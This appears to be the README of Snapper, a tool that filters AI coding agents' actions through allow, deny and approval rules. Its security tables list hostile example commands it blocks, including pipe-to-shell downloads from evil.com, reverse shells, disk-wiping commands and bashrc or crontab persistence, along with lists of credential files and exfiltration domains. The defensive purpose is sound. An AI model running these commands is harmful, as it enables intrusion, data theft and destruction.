# Snapper

**Security rules manager for AI agents** — Fine-grained control over what AI assistants can do.

![Snapper Dashboard](https://img.shields.io/badge/status-beta-yellow) ![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue) ![License](https://img.shields.io/badge/license-MIT-green)

## What is Snapper?

Snapper sits between your AI coding assistants (OpenClaw, Claude Code, Cursor, GitHub Copilot) and the actions they take. It lets you:

- **Allow** specific commands, tools, or integrations
- **Deny** dangerous operations (like `rm -rf /` or accessing `.env` files)
- **Require approval** for sensitive actions before they execute

Think of it as a firewall for AI agents.

## Installation

There are two paths: **local development** (any OS with Docker) and **production deployment** (Ubuntu VPS).

### Local Development

Works on macOS, Linux, or Windows with Docker Desktop.

```bash
git clone https://github.com/jmckinley/snapper.git
cd snapper
docker compose up -d
```

That's it. Dashboard at http://localhost:8000, API docs at http://localhost:8000/api/docs.

To customize settings, copy `.env.example` to `.env` and edit — defaults work out of the box.

### Production (Ubuntu VPS)

One command on a fresh Ubuntu server with Docker installed:

```bash
git clone https://github.com/jmckinley/snapper.git /opt/snapper
cd /opt/snapper
./deploy.sh
```

The script handles everything:
- Generates a production `.env` with a random `SECRET_KEY`
- Builds containers with gunicorn (4 workers)
- Runs database migrations
- Configures Caddy reverse proxy with self-signed TLS
- Opens the firewall port

Result: Snapper at `https://your-server-ip:8443`

**Prerequisites:** `git`, `docker` with compose plugin, `caddy`, `ufw` (all standard on Ubuntu 24.04).

**To update a running deployment:**
```bash
cd /opt/snapper
git pull
docker compose -f docker-compose.yml -f docker-compose.prod.yml up -d --build
docker compose -f docker-compose.yml -f docker-compose.prod.yml run --rm app alembic upgrade head
```

## Agent Setup

### OpenClaw

```bash
curl -fsSL https://raw.githubusercontent.com/jmckinley/snapper/main/scripts/quick-setup.sh | bash
```

Options: `--strict` (require approval for sensitive actions) or `--permissive` (logging only).

### Claude Code

```bash
curl -fsSL https://raw.githubusercontent.com/jmckinley/snapper/main/scripts/claude-code-setup.sh | bash
```

Restart Claude Code after setup for hooks to take effect.

<details>
<summary>Manual Claude Code setup</summary>

1. Install the hook:
```bash
mkdir -p ~/.claude/hooks
curl -fsSL https://raw.githubusercontent.com/jmckinley/snapper/main/scripts/claude-code-hook.sh \
  -o ~/.claude/hooks/pre_tool_use.sh
chmod +x ~/.claude/hooks/pre_tool_use.sh
```

2. Add to `~/.claude/settings.json`:
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "",
        "hooks": [
          {
            "type": "command",
            "command": "~/.claude/hooks/pre_tool_use.sh"
          }
        ]
      }
    ]
  }
}
```

3. Optionally set environment variables:
```bash
export SNAPPER_URL=http://localhost:8000
export SNAPPER_AGENT_ID=claude-code-$(hostname)
```
</details>

## Features

### Rule Types

| Rule Type | Description |
|-----------|-------------|
| **Command Allowlist/Denylist** | Control which shell commands can execute |
| **Credential Protection** | Block access to .env, .pem, SSH keys |
| **Skill Allow/Deny** | Control which ClawHub skills can be installed |
| **Network Egress** | Control outbound network access |
| **Rate Limiting** | Prevent runaway agents |
| **Time Restrictions** | Only allow operations during work hours |
| **Version Enforcement** | Block vulnerable agent versions |
| **Sandbox Required** | Require containerized execution |
| **Human-in-Loop** | Require approval for sensitive actions |

### Telegram Bot

Control Snapper from your phone with the Telegram bot (autocomplete menu on `/`):

| Command | Description |
|---------|-------------|
| `/start` | Start the bot and show help |
| `/help` | Show available commands |
| `/status` | Check Snapper connection |
| `/rules` | View active security rules |
| `/pending` | List pending approvals |
| `/approve <id>` | Approve a pending request |
| `/deny <id>` | Deny a pending request |
| `/test run <cmd>` | Test if a shell command is allowed |
| `/test install <skill>` | Test if a skill install is allowed |
| `/test access <file>` | Test if file access is allowed |
| `/test network <host>` | Test if network egress is allowed |
| `/purge` | List agents for PII purge |
| `/purge <agent_id>` | Purge PII from agent (with confirm) |
| `/purge *` | Purge PII from ALL agents (with confirm) |
| `/block` | Emergency block ALL agent actions |
| `/unblock` | Resume normal operation |

**Quick actions:** When a test is blocked, tap inline buttons to:
- **Allow Once** — One-time pass (no rule created)
- **Allow Always** — Create a persistent allow rule
- **View Rule** — See rule details

See [Telegram Setup Guide](docs/TELEGRAM_SETUP.md) for configuration.

### Additional Endpoints

| Endpoint | Description |
|----------|-------------|
| `POST /agents/{id}/purge-pii` | Remove PII from agent data (GDPR compliance) |
| `POST /agents/{id}/whitelist-ip` | Whitelist IP for network egress |
| `GET /agents/{id}/whitelist-ip` | List whitelisted IPs |
| `DELETE /agents/{id}/whitelist-ip` | Remove whitelisted IP |

---

## Security Coverage

Snapper provides defense-in-depth security for AI agents across multiple layers.

### Named CVEs and Campaigns Mitigated

| CVE/Campaign | Severity | Description | Mitigation |
|--------------|----------|-------------|------------|
| **CVE-2026-25253** | Critical (8.8) | WebSocket RCE via malicious messages from unauthorized origins | `ORIGIN_VALIDATION` rule |
| **CVE-2026-24891** | High (7.8) | Localhost authentication bypass in Snapper < 2.0.5 | `LOCALHOST_RESTRICTION` rule |
| **CVE-2026-25157** | High (8.1) | Command injection via skill parameters in OpenClaw < 2026.1.29 | `VERSION_ENFORCEMENT` rule |
| **ClawHavoc** | Critical (9.8) | 341+ malicious ClawHub skills from threat actor "hightower6eu" | `SKILL_DENYLIST` with patterns |
| **MINJA/AGENTPOISON** | High (7.5) | Memory poisoning attacks on SOUL.md/MEMORY.md | `FILE_ACCESS` approval workflow |

### Remote Code Execution (RCE) Patterns Blocked

| Pattern | Example | Risk |
|---------|---------|------|
| Pipe to shell | `curl http://evil.com/script \| sh` | Downloads and executes arbitrary code |
| Pipe to Python | `wget http://evil.com/payload \| python` | Executes Python payloads |
| Base64 bypass | `echo BASE64 \| base64 -d \| sh` | Obfuscated command execution |
| Command substitution | `$(curl http://evil.com/cmd)` | Hidden command execution |

### Reverse Shell Patterns Blocked

| Pattern | Example |
|---------|---------|
| Netcat | `nc -e /bin/sh attacker.com 4444` |
| Bash TCP | `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` |
| Python | `python -c 'import socket,subprocess...'` |
| Perl | `perl -e 'use Socket;...'` |
| Ruby | `ruby -rsocket -e '...'` |
| PHP | `php -r '$sock=fsockopen(...)'` |

### Destructive Command Patterns Blocked

| Pattern | Example | Risk |
|---------|---------|------|
| Recursive delete | `rm -rf /` or `rm -rf ~` | Complete system/home destruction |
| Disk overwrite | `dd if=/dev/zero of=/dev/sda` | Disk destruction |
| Filesystem format | `mkfs.ext4 /dev/sda1` | Partition destruction |
| Fork bomb | `:(){ :\|:& };:` | System resource exhaustion |
| Permission chaos | `chmod -R 777 /` | Security model destruction |

### Persistence/Privilege Escalation Blocked

| Pattern | Example | Risk |
|---------|---------|------|
| Crontab injection | `echo "..." >> /etc/cron.d/evil` | Scheduled malware execution |
| Bashrc injection | `echo "curl evil.com\|sh" >> ~/.bashrc` | Execution on every login |
| SUID/SGID | `chmod u+s /bin/evil` | Privilege escalation |
| Chown root | `chown root:root /tmp/evil` | Ownership manipulation |

### Credential Protection

| Protected File | Pattern | Risk if Exposed |
|----------------|---------|-----------------|
| Environment files | `.env`, `.env.*` | API keys, database credentials |
| Private keys | `.pem`, `.key`, `.p12`, `.pfx` | TLS/SSH authentication |
| SSH keys | `id_rsa`, `id_ed25519`, `.ssh/*` | Server access |
| Cloud credentials | `.aws/credentials`, `.netrc` | Cloud infrastructure access |
| Application secrets | `credentials.json`, `secrets.yaml` | Service authentication |

### Network Egress Control

**Blocked Exfiltration Domains:**
- `*.pastebin.com` — Code/data sharing
- `*.transfer.sh` — File transfer
- `*.file.io` — File hosting
- `*.0x0.st` — Anonymous file upload

**Blocked Backdoor Ports:**

| Port | Service | Risk |
|------|---------|------|
| 4444 | Metasploit default | Reverse shell listener |
| 5555 | Common backdoor | Android debug / trojans |
| 6666, 6667, 6697 | IRC | Botnet C2 communication |

### Malicious Skill Blocking

**Known Malicious Skills (44 blocked):**
- Original blocklist: `shell-executor-pro`, `file-exfiltrator`, `credential-harvester`, `crypto-miner-hidden`, `reverse-shell-kit`, `keylogger-stealth`, `ransomware-toolkit`, `botnet-client`, `data-wiper`, `privilege-escalator`
- ClawHub typosquats: `clawhub`, `clawhub1`, `clawhubb`, `clawhubcli`, `clawwhub`, `cllawhub`, `clawdhub`, `clawdhub1`
- Random suffix variants: `clawhub-6yr3b`, `clawhub-c9y4p`, `clawhub-d4kxr`, and 20 more
- Auto-updaters: `auto-update-helper`, `skill-auto-updater`, `clawhub-updater`, `self-update-tool`

**Regex Patterns (11 patterns):**

| Pattern | Catches |
|---------|---------|
| `^clawhub[0-9a-z\-]*$` | ClawHub typosquats |
| `^clawdhub[0-9a-z\-]*$` | Clawdhub typosquats |
| `^hightower6eu/.*$` | All skills from malicious publisher (314+) |
| `.*crypto-trader.*` | Crypto trading category (111 malicious) |
| `.*polymarket-bot.*` | Prediction market bots (34 malicious) |
| `.*-auto-updater.*` | Auto-updaters with dynamic payloads (28 malicious) |
| `.*solana-wallet.*` | Wallet drainers |
| `.*-miner-.*` | Crypto miners |
| `.*-stealer.*` | Credential stealers |
| `.*-backdoor.*` | Backdoors |
| `.*-rat$` | Remote access trojans |

**Blocked Publishers:**
- `hightower6eu` — 314+ malicious skills in ClawHavoc campaign

### Trust Scoring

Each agent has adaptive trust metrics:
- `trust_score` (0.0-1.0) — Reduced on violations
- `violation_count` — Cumulative rule violations
- `auto_adjust_trust` — When enabled, automatically degrades trust

### Security Summary

| Layer | Protection |
|-------|------------|
| **Version Control** | Block vulnerable agent versions |
| **Environment** | Require sandboxed execution |
| **Commands** | Block RCE, reverse shells, destructive operations |
| **Skills** | Block 44+ malicious skills, 11 patterns, known bad publishers |
| **Files** | Protect credentials, require approval for sensitive files |
| **Network** | Block exfiltration domains, backdoor ports, with IP whitelist |
| **Rate Limiting** | Prevent abuse and brute force |
| **Approval Workflow** | Human-in-the-loop for sensitive operations |
| **Trust Scoring** | Adaptive trust based on agent behavior |
| **Audit Trail** | Immutable logging of all security events |

---

## Dashboard

| Page | Description |
|------|-------------|
| **Dashboard** | Overview, security score, quick actions |
| **Agents** | Connect and manage AI assistants |
| **Rules** | Create and manage security rules |
| **Security** | Vulnerability tracking, threat feed |
| **Audit** | Review all agent actions |
| **Integrations** | Configure Slack, GitHub, and more |
| **Settings** | Configure alerts and notifications |

## API

Swagger docs at `/api/docs`. Key endpoints:

```
GET    /api/v1/agents          # List agents
POST   /api/v1/rules           # Create a rule
POST   /api/v1/rules/evaluate  # Evaluate a request (used by hooks)
GET    /api/v1/audit/logs      # Get audit logs
GET    /health                 # Health check
GET    /health/ready           # Readiness check (DB + Redis)
```

## Configuration

All settings are environment variables. Copy `.env.example` to `.env` to customize.

Key settings:

| Variable | Default | Description |
|----------|---------|-------------|
| `SECRET_KEY` | *required* | Session signing key (`openssl rand -hex 32`) |
| `DENY_BY_DEFAULT` | `true` | Deny unknown requests (fail-safe) |
| `ALLOWED_HOSTS` | `localhost,127.0.0.1,app` | Accepted Host headers |
| `ALLOWED_ORIGINS` | `http://localhost:8000` | CORS/WebSocket origins |
| `REQUIRE_LOCALHOST_ONLY` | `false` | Reject non-localhost requests |
| `DEBUG` | `true` | Debug mode (set `false` in production) |

See `.env.example` for the full list including database, Redis, Celery, alerting, and notification settings.

## Architecture

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   AI Assistant  │────▶│  PreToolUse     │────▶│    Snapper      │
│  (Claude Code)  │     │  Hook           │     │  Rule Engine    │
└─────────────────┘     └─────────────────┘     └─────────────────┘
                                                        │
                                                        ▼
                                                ┌─────────────────┐
                                                │   Allow / Deny  │
                                                │ / Ask Approval  │
                                                └─────────────────┘
```

**Stack:** FastAPI, PostgreSQL, Redis, Celery, Gunicorn, Docker Compose.

**Containers (5):** app, postgres, redis, celery-worker, celery-beat.

## Common Commands

```bash
# Logs
docker compose logs -f app

# Stop
docker compose down

# Restart
docker compose restart

# Reset database
docker compose down -v && docker compose up -d

# Run migrations
docker compose exec app alembic upgrade head

# Run tests
docker compose exec app python -m pytest tests/ -v
```

For production, prefix with `-f docker-compose.yml -f docker-compose.prod.yml`.

## Troubleshooting

**"Connection refused" on port 8000** — Services may still be starting. Wait 30 seconds, then check `docker compose logs app`.

**403 on dashboard** — Your server's IP/hostname isn't in `ALLOWED_HOSTS`. Add it to `.env`.

**Rate limit errors (429)** — You're hitting the rate limiter. Wait a few seconds or adjust limits in Settings.

**Agent not connecting** — Verify the agent is registered, check `SNAPPER_URL`, and ensure the agent ID matches.

## License

MIT License — see LICENSE file for details.

## Support

- **Issues**: https://github.com/jmckinley/snapper/issues
- **Discussions**: https://github.com/jmckinley/snapper/discussions
